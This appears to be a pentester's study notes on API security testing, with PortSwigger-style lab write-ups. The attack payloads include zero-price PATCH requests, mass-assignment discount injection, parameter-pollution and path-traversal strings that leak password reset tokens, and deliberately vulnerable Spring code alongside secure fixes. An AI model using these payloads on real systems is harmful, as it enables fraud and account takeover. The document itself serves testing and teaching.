tactic: Multiple

**APIs** are the backbone of every dynamic web app  any classic vuln (SQLi, IDOR, SSRF) can exist in an API endpoint. API testing is about finding undocumented endpoints, abusing parameter handling, and exploiting missing access controls that developers assume are "internal only."
## API recon

**Common vulnerable endpoints :**

```
GET
/api/products/1  
/api/products/1/price 
/api/products/1/admin

	/api/v1/users/
	/api/v1/users/<userId>
	/api/v1/oauth/token
	/api/v1/forget-password
	/api/v1/debug
	/api/v1/status
	
```

**Find documentation — always check these paths:**

```
/api
/api/swagger/v1
/api/swagger/v1/users/123
/openapi.json
/api-docs
/swagger-ui.html
/?wsdl
/api/docs
```

**Find undocumented endpoints:**

- Use Burp Scanner to crawl and passively collect API endpoints
- Check JS files — frontend code often references API routes directly
- Change HTTP methods on known endpoints — `GET → POST → PATCH → DELETE → PUT`
    - A `405 Method Not Allowed` or unexpected error confirms the method exists
- Check the `Allow` response header — lists supported methods:

```
	Allow: GET, POST, PATCH, DELETE
```

---

## Security Headers to Check

Every API response should have these — missing = finding:

http

```http
Cache-Control: no-store
Content-Security-Policy: frame-ancestors 'none'
Content-Type: application/json
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

---

## Injection Points

- URL path segments (`/api/users/§id§`)
- Query string parameters (`?name=peter&role=user`)
- JSON/XML request body
- HTTP headers (`Content-Type`, custom headers)
- HTTP method itself (GET vs PATCH vs DELETE)
- Hidden/undocumented parameters in the request body

---

## Checklist

### Endpoint Discovery

- [ ]  Fuzz path segments with common wordlists (`/api/§fuzz§`)
- [ ]  Try removing path segments to find parent endpoints (`/api/users/wiener` → `/api/users` → `/api`)
- [ ]  Change HTTP method on every endpoint  look for unexpected responses
- [ ]  Check JS source files for hardcoded API routes

### Method Tampering

- [ ]  If `GET /api/products/1/price` works, try `PATCH /api/products/1/price` with:

```json
	{"price": 0}
```

- [ ]  Try `POST /api/users/carlos` on user management endpoints
- [ ]  If method returns `403`, try spoofing with headers:

```
	X-HTTP-Method-Override: POST
	X-Method-Override: PATCH
```

### Mass Assignment

- [ ]  Capture a request and add extra fields that shouldn't be user-controlled:


```json
	{"username":"wiener","email":"x@x.com","role":"admin"}
```

- [ ]  Look for discount/pricing objects and inject hidden fields:


```json
	{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
```

- [ ]  Check GET responses for fields that don't appear in the POST  those are candidates

### Server-Side Parameter Pollution (SSPP)

- [ ]  Find a search/lookup endpoint: `/userSearch?name=peter&back=/home`
- [ ]  URL-encode `#` to truncate the server-side request:

```
	GET /userSearch?name=peter%23foo&back=/home
```

```
Server sees: `GET /users/search?name=peter#foo` → `foo` is ignored → confirms injection point since after # You can inject `#` to make the database ignore anything after it. This lets you bypass validation.
```

- [ ]  URL-encode `&` to inject a second parameter:

```
	GET /userSearch?name=peter%26role=admin&back=/home
```

```
Server sees: `GET /users/search?name=peter&role=admin`
```

- [ ]  Inject into password reset to leak reset token:

```
	POST /forgot-password
	username=admin%26field=reset_token
```

- [ ]  Path traversal in REST APIs — escape the intended path:

```
	../../v1/users/administrator/field/passwordResetToken%23
```

```
`%23` (`#`) truncates anything the server appends after your injection
```

### Documentation Abuse

- [ ]  After finding `/api/users/wiener`, strip back to `/api`  look for full docs
- [ ]  Swagger/OpenAPI docs list all endpoints including admin ones  read everything
- [ ]  Try every endpoint listed in docs with an unauthenticated session

---

## Attack Payloads

**Method tampering — set price to zero:**

```http
PATCH /api/products/1/price HTTP/1.1
Host: target.com
Content-Type: application/json

{"price": 0}
```

**Mass assignment — inject discount:**

```json
{
  "chosen_discount": {"percentage": 100},
  "chosen_products": [{"product_id": "1", "name": "Jacket", "quantity": 2, "item_price": 133700}]
}
```

**SSPP  query string injection to leak reset token:**

```
POST /forgot-password
username=administrator%26field=reset_token
```

**SSPP  REST path traversal to reach internal field:**

```
GET /api/v1/users/../../v1/users/administrator/field/passwordResetToken%23
```

---

## White Box Testing

**Vulnerable — mass assignment, Spring auto-binds all fields:**


```java
// User model has a 'role' field the developer assumes users can't set
public class User {
    private String username;
    private String email;
    private String role;  // ← should never come from user input
}

@PostMapping("/api/users/update")
public ResponseEntity<?> updateUser(@RequestBody User user) {
    // ← Spring binds ALL fields from JSON body including 'role'
    userRepository.save(user);
    return ResponseEntity.ok().build();
}
```

**Vulnerable — HTTP method not restricted:**



```java
// Only GET is intended but no restriction is enforced
@RequestMapping("/api/products/{id}/price")
public ResponseEntity<?> getPrice(@PathVariable Long id) {
    return ResponseEntity.ok(productRepository.findById(id).getPrice());
}
// ← PATCH /api/products/1/price with {"price":0} will also hit this
```

**Vulnerable — server-side parameter pollution, user input appended to internal query:**



```java
@GetMapping("/userSearch")
public ResponseEntity<?> search(@RequestParam String name) {
    // ← name is not encoded before being appended to internal API call
    String internalUrl = "http://internal-api/users/search?name=" + name + "&publicProfile=true";
    String result = restTemplate.getForObject(internalUrl, String.class);
    return ResponseEntity.ok(result);
}
// attacker sends name=peter%26role=admin → internal sees name=peter&role=admin&publicProfile=true
```

**Vulnerable — REST path traversal, user input used in path without validation:**



```java
@GetMapping("/api/v2/users/{username}/profile")
public ResponseEntity<?> getProfile(@PathVariable String username) {
    // ← no path traversal check
    String internalUrl = "http://internal-api/v1/users/" + username + "/profile";
    String result = restTemplate.getForObject(internalUrl, String.class);
    return ResponseEntity.ok(result);
}
// attacker sends ../../v1/users/administrator/field/passwordResetToken%23
```

**Secure:**


```java
// Block mass assignment using @JsonIgnore or a dedicated DTO
public class UpdateUserRequest {
    private String username;
    private String email;
    // 'role' field not present → can never be bound from JSON
}

// Restrict HTTP methods explicitly
@GetMapping("/api/products/{id}/price")
public ResponseEntity<?> getPrice(@PathVariable Long id) { ... }

@PatchMapping("/api/products/{id}/price")
@PreAuthorize("hasRole('ADMIN')")  // ← only admins can change price
public ResponseEntity<?> updatePrice(@PathVariable Long id, @RequestBody PriceRequest req) { ... }

// Encode user input before appending to internal requests
@GetMapping("/userSearch")
public ResponseEntity<?> search(@RequestParam String name) {
    String encodedName = UriUtils.encode(name, StandardCharsets.UTF_8);
    String internalUrl = "http://internal-api/users/search?name=" + encodedName + "&publicProfile=true";
    return ResponseEntity.ok(restTemplate.getForObject(internalUrl, String.class));
}

// Validate path variables — reject traversal attempts
@GetMapping("/api/v2/users/{username}/profile")
public ResponseEntity<?> getProfile(@PathVariable String username) {
    if (!username.matches("^[a-zA-Z0-9_-]+$")) {
        return ResponseEntity.badRequest().body("Invalid username");
    }
    // ...
}
```

---


##  Labs 

**Exploiting an API endpoint using documentation**

after changing the email we had an API
`/api/users/wiener``

remove the users and wiener leave only /api we had a documentation

`DELETE /api/user/carlos `


**Finding and exploiting an unused API endpoint**

saw the URL GET /api/products/1/price
discovered PATCH is allowed by responding an error 
```json
{
"price":0
}

```


**Exploiting a mass assignment vulnerability**

```json
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":2,"item_price":133700}]}
```



**Exploiting server-side parameter pollution in a query string**


`%26field=reset_token` 

in the JS forget password we can see a reset token with the url /forget-pass?reset-token=1111



**Exploiting server-side parameter pollution in a REST URL**

`../../v1/users/administrator/field/passwordResetToken%23`

note that using # may bypass certain input validation since it may trick validation layer that it is a separate  or new param

---
## Resources

- [PortSwigger API Testing](https://portswigger.net/web-security/api-testing)
- [HackTricks API Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting)
- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x00-header/)

